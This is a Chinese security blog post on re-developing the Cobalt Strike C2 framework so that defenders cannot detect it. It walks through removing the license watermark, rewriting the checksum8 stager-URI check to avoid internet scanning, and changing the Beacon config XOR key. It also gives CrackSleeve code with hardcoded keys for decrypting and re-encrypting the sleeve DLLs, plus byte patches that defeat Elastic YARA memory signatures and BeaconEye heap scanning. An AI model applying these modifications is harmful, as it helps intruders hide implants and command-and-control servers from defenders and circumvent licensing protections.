# 对Cobalt Strike进行一点二次开发

阅读量 **278306**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-14 10:30:13

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0170d551d564de9f8a.jpg)

## 0x01 watermark去水印

watermark是CS中的水印,这个参数会在`Authorization.java`中进行赋值，从图中也能明显看出主要是对的auth文件的相关解析结果中来判断是否授权

![](https://p2.ssl.qhimg.com/t01c884bdf2e40ceb66.png)

而在生成Stager时会对授权进行判断:

![](https://p3.ssl.qhimg.com/t01a272aa8e9c094846.png)

`ListenerConfig.class`中`pad`方法便是基于水印参数添加特征码字符串,这一段水印代码也自然在所有AV的特征库中

![](https://p3.ssl.qhimg.com/t01fa05b4cfbf6952e5.png)

因此这里我们只需要将其注释掉，然后操作和没有水印的操作一致即可去watermark水印，即不管何种判断都是最后添加一个空的字符串:

![](https://p1.ssl.qhimg.com/t01733f0dd168b12c42.png)

## 0x02 修改checksum8

在生成`HTTP/S
Stager`过程中,主要涉及的就是`GenerateHTTPStager类中的generate方法`,而前文已经提过CS会先参考对应的模板，然后将模板文件中的某部分参数进行修改回填,生成最后的Stager

![](https://p4.ssl.qhimg.com/t011bb5a67a0efd394b.png)

其中也包括了类似UA头的回填(参考本地的profile文件)以及URI的获取:

![](https://p4.ssl.qhimg.com/t016b612f02a9cc534e.png)

至于为什么要通过`getURI`是因为我们知道当使用分段Payload传输时,还需要从远程服务器下载体积较大更复杂的stage，这时就会要访问stage的URL并且通过checksum8进行校验。

###  Stager Url校验算法

当存储着Beacon配置和payload的stage服务器暴露在公网上的时候，是可以通过主动测绘手段发现的。

不幸的是，默认情况下访问该服务是一个伪装的404页面。这也导致了各类扫描器、空间测绘系统、威胁情报平台等并不能基于页面response信息进行有效判断。

随便在fofa上搜索CS服务器就能有一堆默认配置的服务器,这里随机挑选一个:

![](https://p3.ssl.qhimg.com/t011546b0cf393fe5be.png)

并且得知该Stage服务器开放在81端口上,使用Nmap的`grab_beacon_config`脚本进行探测,得到对应的URI为:

![](https://p0.ssl.qhimg.com/t0102999b705a0e0254.png)

然后我们便能访问对应的Stage端口的URI来下载得到对应后阶段的Stage文件:

![](https://p0.ssl.qhimg.com/t01fe3fac669c9413fa.png)

这里我们使用`CobaltStrikeParser`对Stage可以进行一定的解密,从解密的配置中可以看到PublicKey和C2
Server地址,也可以看出来这是一个标准的默认配置profile文件

![](https://p0.ssl.qhimg.com/t013bf8a04284376c66.png)

Stager Url校验算法在公开的NSE脚本中可以找到，关键函数包括：`checksum8、MSFURI、isStager`

先看到对应的HTTPSStager生成部分:

![](https://p4.ssl.qhimg.com/t01d818ebd82e6b0db0.png)

这两个方法都是从`.profile`文件中寻找对应的配置,我们跟进第一个方法:

![](https://p0.ssl.qhimg.com/t01bd58d22ef1c49e0a.png)

![](https://p5.ssl.qhimg.com/t01b4eb999bc8b72240.png)

简单分析一下这个方法,`MSFURI`方法从大小写字母+数字的字符数组中随机指定长度的字符序列并调用checksum8函数计算字符序列的ASCII和与256的模是否等于固定值（32位Stage与64位Stage分别使用92、93作为固定值），如果相等返回字符序列，否则继续直至找到符合条件的字符序列。

其中`isStager`方法在WebServer中进行使用,也正是该类提供了对于Beacon端请求URI的判断和最终提供分阶段Payload供Beacon端下载的作用

![](https://p5.ssl.qhimg.com/t01dbdf9aeb8bff3e07.png)

这个WebServer继承于NanoHTTPD(微型服务器)，看一下它里面的处理逻辑，它的URI就相当于个参数，参数经过checksum8计算后等于92或者93就会返回信息了，这里其实把92和93改掉也可以，但是这个功能还想正常使用，只能改成小于256的，因为算法最后对256取余，也就是说，爆破256次必然能爆破出来。  
因此我们可以重写`checksum8方法`,取消取余操作并且计算一个随机URI的checksum8的结果然后实现重写:

    
    
    public class EchoTest {
        public static long checksum8(String text) {
            if (text.length() < 4) {
                return 0L;
            }
            text = text.replace("/", "");
            long sum = 0L;
            for (int x = 0; x < text.length(); x++) {
                sum += text.charAt(x);
            }
    
            return sum;
        }
    
    
        public static void main(String[] args) throws Exception {
            System.out.println(checksum8("index.js"));
        }
    }
    

![](https://p0.ssl.qhimg.com/t0154e876db9056e69c.png)

最后只需要修改对应的isStager方法即可:

![](https://p0.ssl.qhimg.com/t017f570ba58ba3e6f9.png)

同时还需要修改对应`common/CommonUtils`中的MSFURI方法,该方法传递给Stager之后连接的URI的,因此我们在这里也需要写死我们刚刚定义的URI:

![](https://p1.ssl.qhimg.com/t0180359465dc9de7d7.png)

当然这一部分也可以在profile中进行说明,同样也可以避免空间测绘的全网扫描,这里只是针对使用默认profile文件

## 0x03.修改异或Beacon Config

我们知道Stage本身也是经过一系列异或加密的,而其中就包括了Beacon Config  
Beacon Config的生成在`BeaconPayload类的exportBeaconStage`方法中:

![](https://p5.ssl.qhimg.com/t01e024771ae0ec3045.png)

最终Cobalt Strike会将Settings转化为bytes数组，然后使用固定的密钥进行Xor,并对剩余空白字段填入随机字符

![](https://p5.ssl.qhimg.com/t01f5bedaac6068c208.png)

如果继续跟进就会发现配置信息异或的是固定值，并且依据版本不同而不同:

> cs 3.x版本的配置信息是通过异或0x69解密出的，4.x版本的配置信息是通过异或0x2e解密出的。

![](https://p0.ssl.qhimg.com/t01cd232a9c91ec5746.png)

![](https://p3.ssl.qhimg.com/t01912e4142ce218dca.png)

我们的Stager中就包含着`Beacon Config`,如果想从Stager中查看对应的`Beacon
Config`需要Stager需要进行一定的自解密然后通过config部分异或

在这里我们使用如下的脚本先进行自解密:

    
    
    import sys,struct
    
    filename = sys.argv[1]
    data = open(filename, 'rb').read()
    t = bytearray(data[0x45:])
    (a,b) = struct.unpack_from('<II', t)
    key = a
    t2 = t[8:]
    out = ""
    for i in range(len(t2)/4):
        temp = struct.unpack_from('<I', t2[i*4:])[0]
        temp ^= key
        out += struct.pack('<I', temp)
        key ^= temp
    open(filename+'.decoded', 'wb').write(out)
    

![](https://p0.ssl.qhimg.com/t014e80c77933af6a55.png)

由于已经知道是4的版本,我们直接将decode文件放入winhex中然后与`0x2e`异或:

![](https://p2.ssl.qhimg.com/t01176ef749cc1478fa.png)

从3.x到4.x，cs自解密的算法没变，自解密后再解密配置文件的算法只是密钥发生变化，而且是固定的

前文提到Stage中Config配置的生成在`BeaconPayload`中的exportBeaconStage方法中,其调用了`beacon_obfuscate`进行异或混淆

为了避免内存查杀,可以让其直接可以加载为无加密的资源（资源替换sleeve文件夹）去掉解密过程，让其直接读取字节数组后返回。或者替换加密密钥,不使用默认的0x2e或者3中的0x69,这里我们选取后者进行开发

考虑将其替换为`0x1e`

![](https://p4.ssl.qhimg.com/t01178095f8a20db2b8.png)

当然到这里更改完并没有解决问题,在CS中生成shellcode时是会有固定的参考模板,同时依赖了模板DLL,在CS
4.x之后资源文件都会加密形式存储在sleeve文件夹中:

![](https://p2.ssl.qhimg.com/t01dac4983ff21204a0.png)

因此我们在这里如果想要完全适配还需要将所有模板DLL中的异或密钥进行更改，但是必须要做的就是解密模板DLL,因此这就和认证流程相关，主要看`Authorization类`的构造方法

![](https://p4.ssl.qhimg.com/t01c85f1a1e1a10973c.png)

跟进setup最后到该方法`SleeveSecurity.registerKey`:

![](https://p2.ssl.qhimg.com/t0164e2c525ae82ed45.png)

使用传入的值计算一个长度为256的摘要，再取0-16作为AES的密钥，取16-32作为HmacSHA256的密钥。这里就结束了，但是既然取了密钥，那么肯定要进行操作，可以在`SleeveSecurity.decrypt`方法中看到

![](https://p1.ssl.qhimg.com/t01c5b4700f36777141.png)

校验HMAC，正确后进行AES解密。在`SleevedResource._readResource`方法中存在`decrypt`调用：

![](https://p4.ssl.qhimg.com/t0109995b398427687a.png)

这个方法接受一个字符串作为文件路径，并将路径中的`resources/`替换为`sleeve/`，之后读取文件内容并进行解密。

因此其实最重要的部分就是在

    
    
    SleevedResource.Setup(var15);
    

只有拿到这个Key我们才有办法解密，官方用这个key加密了sleeve下的dll，将key放在了`.auth`文件中，那么key是一个固定值

现在我们在分析一下`.auth`文件,其结构如下:

    
    
    0   6位字节，特定的文件头
    1   4位字节，转换为有符号整数后等于29999999
    2   4位字节，转换为有符号整数后不等于0
    3   1位字节，其值大于43小于128
    4   1位字节，其值为16
    5   16位字节，值为key，这里注意4.3版本还包含了之前的key和key长度
    那么4.3版本的.auth文件有效长度应该为83位字节，即4.0版本为32位，之后每一个版本都在前面版本的基础上增加17位。
    

因此我们能通过一定的转换最终得到每个版本默认的key,最终利用已经前人写好的解密脚本进行解密即可:  
[https://github.com/ca3tie1/CrackSleeve](https://)

注意在此处我进行了一定的替换,否则会解密失败:

    
    
    import common.*;
    import dns.SleeveSecurity;
    import java.io.*;
    import java.util.Enumeration;
    import java.util.jar.JarEntry;
    import java.util.jar.JarFile;
    
    
    public class CrackSleeve {
        private static byte[] OriginKey40 = {27, -27, -66, 82, -58, 37, 92, 51, 85, -114, -118, 28, -74, 103, -53, 6 };
        private static byte[] OriginKey41 = {-128, -29, 42, 116, 32, 96, -72, -124, 65, -101, -96, -63, 113, -55, -86, 118 };
        private static byte[] OriginKey42 = {-78, 13, 72, 122, -35, -44, 113, 52, 24, -14, -43, -93, -82, 2, -89, -96};
        private static byte[] OriginKey43 = {58, 68, 37, 73, 15, 56, -102, -18, -61, 18, -67, -41, 88, -83, 43, -103};
    
        private static byte[] CustomizeKey = null;
    
        private String DecDir = "Resource/Decode/sleeve";
        private String EncDir = "Resource/Encode/sleeve";
    
    
        public static void main(String[] args) throws IOException {
            if (args.length == 0 || args[0].equals("-h") || args[0].equals("--help")) {
                System.out.println("UseAge: CrackSleeve OPTION [key]");
                System.out.println("Options:");
                System.out.println("\tdecode\t\tDecode sleeve files");
                System.out.println("\tencode\t\tEncode sleeve files");
                System.out.println("\tkey\t\tCustomize key string for encode sleeve files");
                System.exit(0);
            }
            String option = args[0];
    //        if (option.toLowerCase().equals("encode"))
    //        {
    //            if (args.length <= 1){
    //                System.out.println("[-] Please enter key.");
    //                System.exit(0);
    //            }
    //            String CustomizeKeyStr = args[1];
    //            if (CustomizeKeyStr.length() < 16)
    //            {
    //                System.out.println("[-] key length must be 16.");
    //                System.exit(0);
    //            }
    //            System.out.println("Init Key: "+CustomizeKeyStr.substring(0,16));
    //            CustomizeKey = CustomizeKeyStr.substring(0,16).getBytes();
    //        }
    
    
            CrackSleeve Cracker = new CrackSleeve();
            // 使用正版key初始化SleeveSecurity中的key
            if (option.equals("decode")){
                CrackSleevedResource.Setup(OriginKey43);
                Cracker.DecodeFile();
            }else if (option.equals("encode")){
                //CrackSleevedResource.Setup(CustomizeKey);
                CrackSleevedResource.Setup(OriginKey43);
                Cracker.EncodeFile();
            }
        }
    
        private void DecodeFile() throws IOException {
            // 文件保存目录
            File saveDir = new File(this.DecDir);
            if (!saveDir.isDirectory())
                saveDir.mkdirs();
    
            // 获取jar文件中sleeve文件夹下的文件列表
            try {
                String path = this.getClass().getClassLoader().getResource("sleeve").getPath();
                String jarPath = path.substring(5,path.indexOf("!/"));
                Enumeration<JarEntry> jarEnum = new JarFile(new File(jarPath)).entries();
                while (jarEnum.hasMoreElements())
                {
                    JarEntry Element = jarEnum.nextElement();
                    String FileName = Element.getName();
                    if (FileName.indexOf("sleeve")>=0 && !FileName.equals("sleeve/")) {
                        System.out.print("[+] Decoding "+FileName+"......");
                        byte[] decBytes = CrackSleevedResource.DecodeResource(FileName);
                        if (decBytes.length > 0) {
                            System.out.println("Done.");
                            CommonUtils.writeToFile(new File(saveDir,"../"+FileName),decBytes);
                        }
                        else
                            System.out.println("Fail.");
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
    
        }
    
        private void EncodeFile(){
            // 文件保存目录
            File saveDir = new File(this.EncDir);
            if (!saveDir.isDirectory())
                saveDir.mkdirs();
    
            // 获取解密文件列表
            File decDir = new File(this.DecDir);
            File[] decFiles = decDir.listFiles();
            if (decFiles.length == 0) {
                System.out.println("[-] There's no file to encode, please decode first.");
                System.exit(0);
            }
    
            for (File file : decFiles){
                String filename = decDir.getPath()+"/"+file.getName();
                System.out.print("[+] Encoding " + file.getName() + "......");
                byte[] encBytes = CrackSleevedResource.EncodeResource(filename);
                if (encBytes.length > 0) {
                    System.out.println("Done.");
                    CommonUtils.writeToFile(new File(saveDir,file.getName()),encBytes);
                }
                else
                    System.out.println("Fail.");
            }
        }
    }
    
    class CrackSleevedResource{
        private static CrackSleevedResource singleton;
    
        private SleeveSecurity data = new SleeveSecurity();
    
        public static void Setup(byte[] paramArrayOfbyte) {
            singleton = new CrackSleevedResource(paramArrayOfbyte);
            //singleton = new CrackSleevedResource(CommonUtils.readResource("resources/cobaltstrike.auth"));
        }
    
        public static byte[] DecodeResource(String paramString) {
            return singleton._DecodeResource(paramString);
        }
    
        public static byte[] EncodeResource(String paramString) {
            return singleton._EncodeResource(paramString);
        }
    
        private CrackSleevedResource(byte[] paramArrayOfbyte) {
            this.data.registerKey(paramArrayOfbyte);
        }
    
        private byte[] _DecodeResource(String paramString) {
            byte[] arrayOfByte1 = CommonUtils.readResource(paramString);
            if (arrayOfByte1.length > 0) {
                long l = System.currentTimeMillis();
                return this.data.decrypt(arrayOfByte1);
            }
            byte[] arrayOfByte2 = CommonUtils.readResource(paramString);
            if (arrayOfByte2.length == 0) {
                CommonUtils.print_error("Could not find sleeved resource: " + paramString + " [ERROR]");
            } else {
                CommonUtils.print_stat("Used internal resource: " + paramString);
            }
            return arrayOfByte2;
        }
    
        private byte[] _EncodeResource(String paramString){
            try {
                File fileResource = new File(paramString);
                InputStream fileStream = new FileInputStream(fileResource);
                if (fileStream != null)
                {
                    byte[] fileBytes = CommonUtils.readAll(fileStream);
                    if (fileBytes.length > 0)
                    {
                        byte[] fileEncBytes = this.data.encrypt(fileBytes);
                        return fileEncBytes;
                    }
                }
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            return null;
        }
    }
    

其他地方不需要修改,然后我们将cs的jar包和该文件放置在同一文件夹中,运行命令:

    
    
    javac -encoding UTF-8 -classpath cobaltstrike.jar CrackSleeve.java
    java -classpath cobaltstrike.jar;./ CrackSleeve decode
    

成功解密得到对应的DLL模板文件:

![](https://p1.ssl.qhimg.com/t01910e95c12c6b7224.png)

之后的操作就是需要修改一系列的DLL,将异或数据用之前的`0x1e`进行替换,这里以`Beacon.x64.dll`为例,使用IDA打开后全局搜索`0x2e`发现:

![](https://p2.ssl.qhimg.com/t01862a262de4c25810.png)

修改字节然后记得`apply patches to input file`

![](https://p2.ssl.qhimg.com/t0186bb68743c6584c6.png)

这里需要修改的文件有如下:

    
    
    beacon.dll
    beacon.x64.dll
    dnsb.dll
    dnsb.x64.dll
    pivot.dll
    pivot.x64.dll
    extc2.dll
    extc2.x64.dll
    

方法都是类似,搜索`0x2e`看是否存在异或行为,出现则Patch最后apply即可,当全部修改完成后我们还需要加密回去再替换掉sleeve文件夹中的所有文件:

![](https://p5.ssl.qhimg.com/t01fc9bcff54ad0b950.png)

随后用同样的方式进行加密:

    
    
    java -classpath cobaltstrike.jar;./ CrackSleeve encode
    

![](https://p3.ssl.qhimg.com/t01eba03ddb0a5761ee.png)

然后我们再讲加密后的DLL全部替换到原sleeve文件夹中,然后重新Build起`cobalt strike`的jar即可

测试HTTP和HTTPS监听器是否正常工作,如果正常工作则Bypass成功,这样就成功的避免了Beacon Config的检测

![](https://p0.ssl.qhimg.com/t019fe707487bbf238f.png)

现在我们在重新使用`parse_beacon_config.py`已经无法得到对应的Beacon Config配置文件

![](https://p1.ssl.qhimg.com/t01aceb0e3d82a8a424.png)

## 0x04 基于内存签名检测的绕过

由于CS的本身特性(反射注入DLL等),在内存中肯定是有或多或少的特征,这里我们以`sleep_mask`为例,在`CS 3.12版本后`推出了
**混淆与睡眠** 内存规避的功能。

我们知道在环境中查找Beacon存在的一种方法是扫描所有正在运行的进程以查找指示攻击活动的常见字符串。例如，搜索`ReflectiveLoader`字符串将找到不会更改此导出函数名称的内存驻留反射DLL,因此为了对内存扫描进行一定规避,其引入了混淆与睡眠

> 其功能可以理解为:Beacon 是（主要）单线程信标。它请求任务，执行这些任务，然后进入睡眠状态。Beacon
> 大部分时间都在休眠。当启用`obfuscate-and-> sleep`时，Beacon会在进入睡眠状态之前在内存中混淆自身。当代理醒来时，它会自己恢复到原来的状态。

在[CS官方介绍](https://www.cobaltstrike.com/blog/cobalt-strike-3-12-blink-and-youll-miss-it/)中给出了如下的使用方法:

![](https://p3.ssl.qhimg.com/t01bd5df80f4e9b9676.png)

只需要在profile文件中设置`sleep_mask="true"`即可开启睡眠混淆功能,这里我们分别来看一下开启前和开启后的内存变化,这里使用`Process
Hacker`找到对应Beacon在内存中的值,此时是开启`sleep_mask`,可以知道该数据是被加密过的  
当我们存在Sleep时,并且设置`sleep_mask=true`

> 注意这里有可能因为profile设置了`cleanup`选项，而将内存中的Stage释放掉了,导致出现没法在内存中找到对应的值的情况

![](https://p3.ssl.qhimg.com/t01646092279b5d619f.png)

当通过设置`sleep 0`为实时后会取消混淆,我们再点击`re-read`会发现会取消混淆，恢复到初始的模式:

![](https://p5.ssl.qhimg.com/t01b9acb9a2385cb533.png)

然而在[https://www.elastic.co/cn/blog/detecting-cobalt-strike-with-memory-signatures](https://)中提到,Beacon 的 obfuscate-and-sleep
选项只会混淆字符串和数据，而负责进行加解密的代码部分不会混淆，且在内存中可以被标记出来,因此当我们拥有这一段数据时便能够在内存中进行匹配从而找到，我们利用如下的yara规则:

    
    
    rule cobaltstrike_beacon_4_2_decrypt
    {
    meta:
        author = "Elastic"
        description = "Identifies deobfuscation routine used in Cobalt Strike Beacon DLL version 4.2."
    strings:
        $a_x64 = {4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03}
        $a_x86 = {8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85 C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2}
    condition:
         any of them
    }
    

的确在内存中匹配到了对应的值,这意味着即使我们使用混淆与睡眠也依然可以通过某种内存签名进行检测:

![](https://p5.ssl.qhimg.com/t016546e8c759ab0e55.png)

因此在这里我们需要对其进行绕过,其实绕过思路也十分简单,首先我们打开`beacon.x64.dll`(这里就用之前解密好的DLL),找到特征对应的地方:  
通过Hex匹配定位到了功能代码部分:

![](https://p4.ssl.qhimg.com/t015a6fb9fc4ea157b0.png)

其对应的伪代码如下所示:

![](https://p5.ssl.qhimg.com/t01578de0d56d4c0da9.png)

因此我们想要改动Hex部分,甚至不需要对程序逻辑进行改动,只需要对赋值的先后进行调整即可,这里我们找对应函数对赋值进行顺序替换:

这里第一条指令是将[r10]赋值给r9d,对应的汇编指令为`8B 0A`,第二条指令是将[r10+4]赋值给r11d,对应的汇编指令为`8B 5A
04`,我们知道更改这两个赋值顺序是没有任何影响的,因此我们只需要稍微进行Patch即可

![](https://p2.ssl.qhimg.com/t019725200c557b4e3a.png)

下面只需要替换一下即可:

![](https://p3.ssl.qhimg.com/t01ec6f96791a158cd3.png)

32位的`beacon.dll`修改也是类似的,这里就不继续展开对`beacon.dll`的相关patch了,只是需要注意最后同样需要加密回去然后替换sleeve文件Rebuild

![](https://p3.ssl.qhimg.com/t01d7d08e9f9559dee2.png)

###  一点关于BeaconEye的疑惑

理论上修改mov指令的顺序对堆布局和分配应该不会有任何影响,但实际上会在最后笔者发现修改完后用自带的生成HTTPS的Stager并不会被BeaconEye检测到,而HTTP则会被检测,并且由其衍生spawn出来的都会被检测到,尝试动态调试但发现BeaconEye在堆查询中没有匹配到对应的规则:

![](https://p4.ssl.qhimg.com/t017363207133d2069e.png)

![](https://p2.ssl.qhimg.com/t010b1babe6566c4fcd.png)

而单独提取使用yara匹配时在内存中是存在的:

![](https://p3.ssl.qhimg.com/t0130bc73c6c36266b4.png)

因此在这里比较疑惑,个人感觉不是因为对内存签名检测的绕过引起的,因为并没有影响堆布局,这里还希望其他师傅指点！

## 0x05 Bypass BeaconEye

BeaconEye的出现可以说使得很多隐匿的手段都变得无效,其主要原因归结于两点:

  * 1.将Beacon Config配置文件作为特征
  * 2.扫描的范围在内存的堆之中

Beacon虽然会加密存储在Loader中,但是怎样加密最后都会释放到堆内存当中,并且是以一种裸露的方式存在,即使在`profile`配置文件中设置`sleep_mask`,也仅是对代码段进行保护,不管何种加密最终都要进行解密,而`Beacon
Config`则会一直裸露在堆内存中,这也是BeaconEye针对堆扫描的原因所在

在探讨现有的Bypass思路之前我们先再来回顾一下`Beacon Config`在java中的数据格式是怎样的的?

![](https://p3.ssl.qhimg.com/t01334bec9675002c3c.png)

在Beacon
config的生成阶段都是通过`addshort或者addint`等方式,是采取的通过追加了一个结构体的方式,并且这个结构的字段也很明显,分别对应的index、类型以及长度和最后的value值

![](https://p2.ssl.qhimg.com/t01ba1684b0100d9fa0.png)

根据这样一种结构我们便能够解析出在内存中的Beacon
Config配置,但是这和实际加载的数据结构却又有区别,让我们逆向对应的32位的`Beacon.dll`:

> 前文我们知道在Beacon
> config生成后会有异或加密密钥的操作,对应版本不同密钥分别为0x69和0x2e,因此这里在DLL中肯定会先进行解密,然后写入,因此我们只需要在DLL中搜索对应异或,找到对应的函数即可

![](https://p4.ssl.qhimg.com/t016b3ab9fe729642e8.png)

因此在32位的DLL中其实只写入了两处数据,第一次写入type后再根据type的值写入value数据,并且注意到这里是`_WORD`类型,对应2个字节

而java中其实相当于使用addshort追加一个结构体,并且当写入Type时实际上也是2个字节

![](https://p4.ssl.qhimg.com/t01e17daff5ec0349a9.png)

![](https://p0.ssl.qhimg.com/t01c39437b920dba035.png)

因此我的理解是`TeamServer`预先分配的2个字节用于对应的Type,而实际上DLL也只分别只用两个字节写入了type,但是并没有马上接着写入2个字节或4个字节的`Value`,结合伪码便可以清楚看到,这里预留了4个字节来表示Type,而后四个字节才写入Value

![](https://p2.ssl.qhimg.com/t01c48a986f41dfca84.png)

在yara规则中(以32位为例)实际上对Type的表示使用了4个字节,这会导致后两个字节实际上默认是空的,让我们看一下对应的yara规则:

![](https://p4.ssl.qhimg.com/t019afc63ea2e60c301.png)

>
> 也有说法认为在TeamServer的Java代码中使用长度为4个字节的Int类型来写入type,个人觉得并不是这样,在之前的图中也看到了写入Type时只write了长度为2的byte,只是在内存存储上的确使用了4个字节来存储这个Type,因此也意味着在有效Type和Data之间还存在两个字节的预留,默认被memset初始化为0

这样的差异虽然在功能上完全不影响,但是由于存在数据Gap,导致我们针对后两个字节的任意修改便能够轻松绕过BeaconEye所基于的yara规则

当然这样的修改还是同样需要基于`Beacon.dll`,这里对32位和64位的dll都进行一定的修改来达到绕过yara规则的效果:

先以32位DLL为例,用IDA打开解码后的DLL后找到对应的初始化内存位置:

![](https://p3.ssl.qhimg.com/t01bcc5c2d15f3da0a4.png)

其中`memset`进行初始化操作,函数原型如下:

    
    
    # include <string.h>
    void *memset(void *s, int c, unsigned long n);
    

> 函数的功能是：将指针变量s所指向的前n字节的内存单元用一个“整数”c替换，注意
> c是int型。s是void*型的指针变量，所以它可以为任何类型的数据进行初始化。

因此我们在这里只要修改为非0数即可,修改字节将`6A 00`修改后面的00即可

![](https://p4.ssl.qhimg.com/t0160486f7c4d3cfaa4.png)

再来修改`beacon.x64.dll`,同样定位到进行内存初始化的函数处:

![](https://p0.ssl.qhimg.com/t013c71b00656f94a87.png)

这里由于是用0来初始化内存,因此使用的异或:

![](https://p3.ssl.qhimg.com/t0113f27d10db9cc953.png)

我们将汇编指令改成`mov edx xx`即可,修改完成后我们还需要重新对解密的DLL进行加密,然后重新替换到sleeve文件中重新rebuild下:

> 注意xor edx edx只有两个字节,因此为了不破坏结构,进行修改时也尽量只使用两个字节的机器码实现修改

![](https://p5.ssl.qhimg.com/t011febf1eb4e9b6291.png)

现在我们生成一个简单的32位的Stager然后运行再使用BeaconEye查看效果,可以看到由于我们已经修改对应的特征位,使用默认的yara规则已经匹配不到Beacon
Config配置

![](https://p2.ssl.qhimg.com/t01b756f1a2b3f747f3.png)

再来验证64位Stager发现同样BeaconEye以及之前基于签名检测的yara规则均失效

![](https://p3.ssl.qhimg.com/t015131151fe5e68763.png)

## 0x06 关于Bypass BeaconEye的其他一些说明

其实通过上述所说的修改后市面上所有的检测Beacon的工具都已经检测不到,类似[EvilEye](https://github.com/akkuman/EvilEye)、以及[CobaltStrike-scan](https://github.com/Apr4h/CobaltStrikeScan)等,其本质上只是绕过对于内存特征的检测,因为yara规则是写死的,我们只需要修改使得内存特征和yara规则稍有偏差便能够绕过

>
> 对检测而言的话原理上只需要将`00`修改为通配符即可重新检测得到,但我将`00修改为??`后还是没检测出来,使用yara也没检测出来,这里原因不详,理论上修改内存初始化的值后Type对应的预留部分的值应该会被相同值填充

![](https://p3.ssl.qhimg.com/t0144ed2f31206e0a60.png)

但实际上yara并没有在内存中匹配如上这样的数据,所以这里我也不知道怎么检测这种绕过,有了解的师傅还请指教指教！

这其实是绕过Beaconeye的 **第一种方式** ,也就是通过绕过内存规则, **第二种方式** 已经被提及到,那就是因为 **堆遍历算法缺陷**
，因为BeaconEye是使用了`NtQueryVirtualMemory`函数进行堆的枚举。使用该函数获得的堆大小只会计算属性一致的内存页，而实际上堆段中的内存属性是不同且不连贯的,这导致BeaconEye在获取堆信息时实际只获取了堆的第一个堆段的内容,因此通过调用`SymInitialize函数`或反复调用HeapAlloc等方式,Payload分配在某个堆的第二个Segment即堆段时便无法检测到

这种方式可以使用微软提供的`HeapWalk`循环遍历所有分配的堆块的方式,相当于遍历了整个堆内存来解决

![](https://p5.ssl.qhimg.com/t01f5d4a63b0435ecee.png)

**第三种方式**
更为彻底,那就是采取堆加密的方式,大致思路就是对`sleep`进行Hook后,在Sleep后先挂起所有线程,然后对堆实现加密（例如简单的异或加密）,随后在恢复线程之前进行解密

这里并没有继续深入,可以参考原文:  
[https://www.arashparsa.com/hook-heaps-and-live-free/](https://)

## 0x07 总结

上述只是对现有的一些功能的改进和绕过,目的也是了解和熟悉整个CS的工作流程以及相关二次开发的步骤，参考了很多其他师傅们的思路和相关文章,如有不当之处还请指正！

* * *

参考文章:  
[https://www.cobaltstrike.com/blog/cobalt-strike-3-12-blink-and-youll-miss-it/](https://)  
[https://www.elastic.co/cn/blog/detecting-cobalt-strike-with-memory-signatures](https://)  
[https://www.arashparsa.com/hook-heaps-and-live-free/](https://)  
[https://www.anquanke.com/post/id/253039#h2-6](https://)  
[https://www.ctfiot.com/3969.html](https://)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Crispr** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/265090](/post/id/265090)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [windows安全](/tag/windows安全)
  * [工具开发](/tag/工具开发)

 **+1** __17赞

 __收藏

![](https://p4.ssl.qhimg.com/t01f727a088f341ab8f.png) Crispr

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

